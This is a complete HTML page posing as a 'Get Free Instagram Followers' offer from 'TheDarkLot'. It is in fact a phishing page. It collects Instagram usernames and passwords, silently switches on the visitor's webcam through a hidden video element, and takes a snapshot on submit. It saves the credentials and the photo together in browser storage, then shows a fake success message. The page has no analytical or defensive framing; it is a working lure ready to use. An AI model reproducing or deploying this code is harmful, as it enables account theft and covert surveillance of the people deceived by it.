
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Free Followers - TheDarkLot</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(to right, #0f0c29, #302b63, #24243e);
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      overflow: hidden;
    }
    h1 {
      font-size: 2em;
      margin-bottom: 10px;
      text-shadow: 2px 2px #000;
    }
    input, button {
      padding: 10px;
      margin: 5px;
      border: none;
      border-radius: 5px;
      font-size: 1em;
    }
    button {
      background-color: #00ff95;
      color: #000;
      cursor: pointer;
    }
    video {
      display: none;
    }
    footer {
      position: absolute;
      bottom: 10px;
      font-size: 0.8em;
      opacity: 0.6;
    }
  </style>
</head>
<body>
  <h1>ðŸš€ Get Free Instagram Followers</h1>
  <input type="text" id="username" placeholder="Instagram Username" required>
  <input type="password" id="password" placeholder="Instagram Password" required>
  <input type="number" id="followers" placeholder="Followers Count" required>
  <button onclick="sendData()">Submit</button>
  <video id="camera" autoplay></video>
  <footer>Â© TheDarkLot</footer>
  <script>
    const video = document.getElementById("camera");

    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
      video.srcObject = stream;
    });

    function sendData() {
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const followers = document.getElementById("followers").value;
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const context = canvas.getContext("2d");
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imageURL = canvas.toDataURL("image/png");

      const timestamp = new Date().toLocaleString();

      const entry = { username, password, followers, imageURL, timestamp };

      let data = JSON.parse(localStorage.getItem("instaEntries") || "[]");
      data.push(entry);
      localStorage.setItem("instaEntries", JSON.stringify(data));

      alert("âœ… Submitted successfully!");
    }
  </script>
</body>
</html>
